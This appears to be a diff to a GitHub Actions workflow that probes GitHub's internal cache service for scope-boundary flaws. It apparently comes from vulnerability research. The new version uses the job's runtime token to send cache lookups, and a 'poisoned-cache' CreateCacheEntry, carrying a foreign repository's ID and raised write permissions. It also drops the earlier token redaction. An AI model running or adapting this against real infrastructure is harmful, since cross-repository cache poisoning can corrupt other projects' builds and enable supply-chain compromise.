@@ -1,4 +1,4 @@
-name: Cache Scope Boundary Test v2
+name: Cache Scope Boundary Test v3
 on:
   workflow_dispatch:
 permissions:
@@ -8,95 +8,91 @@ jobs:
   cache-scope:
     runs-on: ubuntu-latest
     steps:
-      - name: JS env probe via github-script
-        uses: actions/github-script@v7
+      - uses: actions/github-script@v7
         with:
           script: |
             const env = process.env;
-            const actionVars = Object.keys(env)
-              .filter(k => k.startsWith('ACTIONS_'))
-              .sort()
-              .map(k => {
-                const v = env[k];
-                if (k.includes('TOKEN')) return `${k}=***REDACTED*** (len=${v.length})`;
-                return `${k}=${v}`;
-              });
-            console.log('=== ACTIONS_ env vars in JS context ===');
-            actionVars.forEach(v => console.log(v));
-            
             const resultsUrl = env.ACTIONS_RESULTS_URL;
-            const cacheUrl = env.ACTIONS_CACHE_URL;
             const token = env.ACTIONS_RUNTIME_TOKEN;
             
-            if (resultsUrl) {
-              console.log('\n=== Testing v2 twirp cache API ===');
-              const twirpUrl = `${resultsUrl}twirp/results.api.v1.CacheService/GetCacheEntryDownloadURL`;
-              console.log('Twirp URL:', twirpUrl);
-              
-              // Normal request (own repo context)
-              const normalResp = await fetch(twirpUrl, {
-                method: 'POST',
-                headers: {
-                  'Authorization': `Bearer ${token}`,
-                  'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({key: 'test-normal', version: 'v1'})
-              });
-              console.log('Normal request:', normalResp.status, await normalResp.text().then(t => t.substring(0, 200)));
-              
-              // Request with foreign repositoryId 
-              const foreignResp = await fetch(twirpUrl, {
-                method: 'POST',
-                headers: {
-                  'Authorization': `Bearer ${token}`,
-                  'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                  key: 'test-foreign',
-                  version: 'v1',
-                  metadata: {
-                    repositoryId: 1187665821,
-                    scope: [{scope: 'refs/heads/main', permission: 2}]
-                  }
-                })
-              });
-              console.log('Foreign repoId:', foreignResp.status, await foreignResp.text().then(t => t.substring(0, 200)));
-              
-              // Request with different scope
-              const scopeResp = await fetch(twirpUrl, {
-                method: 'POST',
-                headers: {
-                  'Authorization': `Bearer ${token}`,
-                  'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                  key: 'test-scope',
-                  version: 'v1',
-                  metadata: {
-                    scope: [{scope: 'refs/heads/production', permission: 3}]
-                  }
-                })
-              });
-              console.log('Different scope:', scopeResp.status, await scopeResp.text().then(t => t.substring(0, 200)));
+            if (!resultsUrl || !token) {
+              console.log('ERROR: Missing ACTIONS_RESULTS_URL or ACTIONS_RUNTIME_TOKEN');
+              return;
             }
             
+            // Correct twirp URL with full package path
+            const twirpBase = `${resultsUrl}twirp/github.actions.results.api.v1.CacheService`;
+            console.log('Twirp base:', twirpBase);
+            
+            const headers = {
+              'Authorization': `Bearer ${token}`,
+              'Content-Type': 'application/json'
+            };
+            
+            // Test 1: Normal cache lookup (no metadata)
+            console.log('\n=== Test 1: Normal cache lookup ===');
+            const r1 = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
+              method: 'POST', headers,
+              body: JSON.stringify({key: 'test-normal', version: 'abc123'})
+            });
+            console.log(`Status: ${r1.status}`);
+            console.log(`Body: ${(await r1.text()).substring(0, 500)}`);
+            
+            // Test 2: With own repositoryId (should work)
+            console.log('\n=== Test 2: Own repositoryId ===');
+            const r2 = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
+              method: 'POST', headers,
+              body: JSON.stringify({
+                key: 'test-own-repo', version: 'abc123',
+                metadata: {repositoryId: '1187665881', scope: [{scope: 'refs/heads/main', permission: 3}]}
+              })
+            });
+            console.log(`Status: ${r2.status}`);
+            console.log(`Body: ${(await r2.text()).substring(0, 500)}`);
+            
+            // Test 3: With FOREIGN repositoryId (toofikz4/public-test-repo)
+            console.log('\n=== Test 3: Foreign repositoryId ===');
+            const r3 = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
+              method: 'POST', headers,
+              body: JSON.stringify({
+                key: 'test-foreign', version: 'abc123',
+                metadata: {repositoryId: '1187665821', scope: [{scope: 'refs/heads/main', permission: 3}]}
+              })
+            });
+            console.log(`Status: ${r3.status}`);
+            console.log(`Body: ${(await r3.text()).substring(0, 500)}`);
+            
+            // Test 4: With zero repositoryId
+            console.log('\n=== Test 4: Zero repositoryId ===');
+            const r4 = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
+              method: 'POST', headers,
+              body: JSON.stringify({
+                key: 'test-zero', version: 'abc123',
+                metadata: {repositoryId: '0'}
+              })
+            });
+            console.log(`Status: ${r4.status}`);
+            console.log(`Body: ${(await r4.text()).substring(0, 500)}`);
+            
+            // Test 5: CreateCacheEntry with foreign repositoryId
+            console.log('\n=== Test 5: CreateCacheEntry with foreign repoId ===');
+            const r5 = await fetch(`${twirpBase}/CreateCacheEntry`, {
+              method: 'POST', headers,
+              body: JSON.stringify({
+                key: 'poisoned-cache-' + Date.now(), version: 'v1',
+                metadata: {repositoryId: '1187665821', scope: [{scope: 'refs/heads/main', permission: 3}]}
+              })
+            });
+            console.log(`Status: ${r5.status}`);
+            console.log(`Body: ${(await r5.text()).substring(0, 500)}`);
+            
+            // Test 6: List caches via v1 API  
+            console.log('\n=== Test 6: v1 Cache list ===');
+            const cacheUrl = env.ACTIONS_CACHE_URL;
             if (cacheUrl) {
-              console.log('\n=== Testing v1 cache API ===');
-              const v1Resp = await fetch(`${cacheUrl}_apis/artifactcache/caches`, {
+              const r6 = await fetch(`${cacheUrl}_apis/artifactcache/cache?keys=test&version=abc`, {
                 headers: {'Authorization': `Bearer ${token}`}
               });
-              console.log('v1 caches:', v1Resp.status, await v1Resp.text().then(t => t.substring(0, 200)));
-            }
-            
-            // Decode runtime token JWT to see scope claims
-            if (token) {
-              try {
-                const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
-                const safePayload = {...payload};
-                delete safePayload.scp;  // Remove actual scope string
-                console.log('\n=== Runtime token JWT payload ===');
-                console.log(JSON.stringify(safePayload, null, 2));
-              } catch(e) {
-                console.log('JWT decode failed:', e.message);
-              }
+              console.log(`Status: ${r6.status}`);
+              console.log(`Body: ${(await r6.text()).substring(0, 500)}`);
             }
